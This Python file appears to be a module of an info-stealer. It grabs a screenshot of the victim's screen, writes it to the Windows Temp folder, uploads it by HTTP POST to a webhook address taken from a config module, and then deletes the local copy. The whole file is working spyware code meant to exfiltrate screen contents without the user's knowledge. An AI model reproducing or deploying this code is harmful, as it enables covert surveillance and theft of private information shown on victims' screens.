import os.path, requests, os
from PIL import ImageGrab
from configs import hook

user = os.path.expanduser("~")

def screen():
 sss = ImageGrab.grab()
 sss.save(user+"\\AppData\\Local\\Temp\\ss.png")

 file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
 r = requests.post(hook, files=file)
 try:
  os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
 except:
     pass
